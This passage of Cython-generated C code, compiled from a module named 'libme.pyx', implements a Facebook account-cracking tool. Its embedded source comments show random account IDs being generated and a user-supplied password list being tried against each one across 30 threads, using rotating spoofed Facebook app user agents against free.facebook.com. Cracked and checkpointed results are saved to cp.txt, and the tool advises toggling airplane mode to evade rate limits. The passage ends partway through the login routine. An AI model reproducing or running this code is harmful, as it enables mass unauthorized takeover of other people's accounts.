                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 170, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_10);
                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
                __pyx_t_8 = NULL;
                __pyx_t_12 = 0;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                  __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
                  if (likely(__pyx_t_8)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_8);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                    __pyx_t_12 = 1;
                  }
                }
                #if CYTHON_FAST_PYCALL
                if (PyFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 170, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                #if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 170, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                {
                  __pyx_t_11 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 170, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  if (__pyx_t_8) {
                    __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_8); __pyx_t_8 = NULL;
                  }
                  __Pyx_GIVEREF(__pyx_t_9);
                  PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_12, __pyx_t_9);
                  __Pyx_INCREF(__pyx_v_user);
                  __Pyx_GIVEREF(__pyx_v_user);
                  PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_12, __pyx_v_user);
                  __Pyx_GIVEREF(__pyx_t_10);
                  PyTuple_SET_ITEM(__pyx_t_11, 2+__pyx_t_12, __pyx_t_10);
                  __pyx_t_9 = 0;
                  __pyx_t_10 = 0;
                  __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_11, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 170, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                }
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":169
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__api__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 */
              }
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

              /* "libme.pyx":160
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;0m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
            }
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            goto __pyx_L20_try_end;
            __pyx_L15_error:;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("libme.James.__fb__", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_13, &__pyx_t_1) < 0) __PYX_ERR(0, 160, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_GOTREF(__pyx_t_1);
              __pyx_t_11 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_13, __pyx_t_1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 160, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_11);
              __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_t_11, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
              if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 160, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_20);
              __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_20);
              __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
              if (__pyx_t_19 < 0) __PYX_ERR(0, 160, __pyx_L17_except_error)
              __pyx_t_21 = ((!(__pyx_t_19 != 0)) != 0);
              if (__pyx_t_21) {
                __Pyx_GIVEREF(__pyx_t_2);
                __Pyx_GIVEREF(__pyx_t_13);
                __Pyx_XGIVEREF(__pyx_t_1);
                __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_13, __pyx_t_1);
                __pyx_t_2 = 0; __pyx_t_13 = 0; __pyx_t_1 = 0; 
                __PYX_ERR(0, 160, __pyx_L17_except_error)
              }
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
              goto __pyx_L16_exception_handled;
            }
            __pyx_L17_except_error:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            goto __pyx_L3_error;
            __pyx_L16_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            __pyx_L20_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_15) {
              __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__13, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 160, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_18);
              __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            }
            goto __pyx_L14;
          }
          __pyx_L14:;
        }
        goto __pyx_L27;
        __pyx_L11_error:;
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L3_error;
        __pyx_L27:;
      }

      /* "libme.pyx":171
 * 				for user in self.id:
 * 					coeg.submit(self.__api__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")             # <<<<<<<<<<<<<<
 * 		except Exception as e:
 * 			exit(str(e))
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 171, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":154
 * 		idx = "1000000"
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":172
 * 					coeg.submit(self.__api__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:             # <<<<<<<<<<<<<<
 * 			exit(str(e))
 * 
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__fb__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_13, &__pyx_t_2) < 0) __PYX_ERR(0, 172, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_13);
      __pyx_v_e = __pyx_t_13;

      /* "libme.pyx":173
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:
 * 			exit(str(e))             # <<<<<<<<<<<<<<
 * 
 * 	def __api__(self, uid, pwx):
 */
      __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_e); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 173, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 173, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":154
 * 		idx = "1000000"
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":149
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")
 * 	def __fb__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("libme.James.__fb__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_idx);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_ib);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":175
 * 			exit(str(e))
 * 
 * 	def __api__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_9__api__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_9__api__ = {"__api__", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_5libme_5James_9__api__, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5libme_5James_9__api__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_uid = 0;
  PyObject *__pyx_v_pwx = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__api__ (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_uid,&__pyx_n_s_pwx,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_uid)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__api__", 1, 3, 3, 1); __PYX_ERR(0, 175, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pwx)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__api__", 1, 3, 3, 2); __PYX_ERR(0, 175, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "__api__") < 0)) __PYX_ERR(0, 175, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_self = values[0];
    __pyx_v_uid = values[1];
    __pyx_v_pwx = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("__api__", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 175, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("libme.James.__api__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5libme_5James_8__api__(__pyx_self, __pyx_v_self, __pyx_v_uid, __pyx_v_pwx);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_8__api__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx) {
  PyObject *__pyx_v_ua = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_rex = NULL;
  PyObject *__pyx_v_xo = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__api__", 0);

  /* "libme.pyx":176
 * 
 * 	def __api__(self, uid, pwx):
 * 		ua = random.choice([             # <<<<<<<<<<<<<<
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 * 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 176, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 176, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 176, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_GIVEREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 176, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":188
 * 			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 * 		])
 * 		url = 'https://free.facebook.com'             # <<<<<<<<<<<<<<
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 */
  __Pyx_INCREF(__pyx_kp_s_https_free_facebook_com);
  __pyx_v_url = __pyx_kp_s_https_free_facebook_com;

  /* "libme.pyx":189
 * 		])
 * 		url = 'https://free.facebook.com'
 * 		sys.stdout.write(             # <<<<<<<<<<<<<<
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":190
 * 		url = 'https://free.facebook.com'
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))             # <<<<<<<<<<<<<<
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 */
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_5 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = PyTuple_New(4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
  __pyx_t_2 = 0;
  __pyx_t_4 = 0;
  __pyx_t_6 = 0;
